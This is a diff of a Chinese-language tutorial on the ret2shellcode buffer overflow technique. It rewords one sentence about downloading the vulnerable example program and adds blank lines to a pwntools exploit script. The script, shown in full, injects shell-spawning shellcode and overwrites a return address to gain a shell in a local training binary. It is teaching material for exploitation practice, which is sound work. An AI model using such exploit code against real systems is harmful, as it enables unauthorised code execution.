@@ -37,7 +37,7 @@ int main(void)
 }
 ```
 
-本节示例的漏洞也可以从此处下载：[ret2shellcode](/files/ret2shellcode)
+本节示例的漏洞程序也可以从此处下载：[ret2shellcode](/files/ret2shellcode)
 
 # 漏洞分析
 
@@ -84,11 +84,14 @@ gdb-peda$ pattern_offset  0x41384141
 
 ``` python
 from pwn import *
+
 shellcode = asm(shellcraft.sh())
 buf_addr = 0x804a080
+
 payload = ''
 payload += shellcode.ljust(112,'A')
 payload += p32(buf_addr)
+
 io = process('ret2shellcode')
 io.sendline(payload)
 io.interactive()
